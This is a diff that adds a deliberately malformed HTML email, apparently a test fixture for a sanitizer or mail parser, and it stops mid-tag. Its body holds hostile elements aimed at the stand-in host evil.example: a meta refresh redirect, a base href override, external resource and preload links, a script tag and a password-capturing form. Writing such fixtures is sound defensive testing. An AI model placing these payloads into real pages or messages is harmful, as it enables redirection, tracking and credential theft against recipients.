@@ -1,0 +1,22 @@
+From: "Mallory =?utf-8?b?w4lsw6g=?=" <mallory@example.com>
+To: victim@example.org, "Group": a@b.c, d@e.f;
+Subject: =?iso-8859-1?q?Hostile_=E9?= fixture
+Message-ID: <hostile-5@example.com>
+In-Reply-To: <parent@example.com>
+References: <root@example.com> <parent@example.com>
+Date: Tue, 02 Nov 2026 10:00:00 +иииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии0000
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<!DOCTYPE html>
+<html><head>
+<meta http-equiv="refresh" content="0;url=https://evil.example/refresh">
+<meta http-equiv="Content-Security-Policy" content="default-src *">
+<base href="https://evil.example/">
+<link rel="stylesheet" href="https://evil.example/x.css">
+<link rel="dns-prefetch" href="//evil.example">
+<link rel="preload" as="image" href="https://evil.example/preload.png">
+<script>elert('head')</script>
+<method=postr
+  <input type=password name=p><input type=image src="https://evil.example/i.png">
+  <button formacti
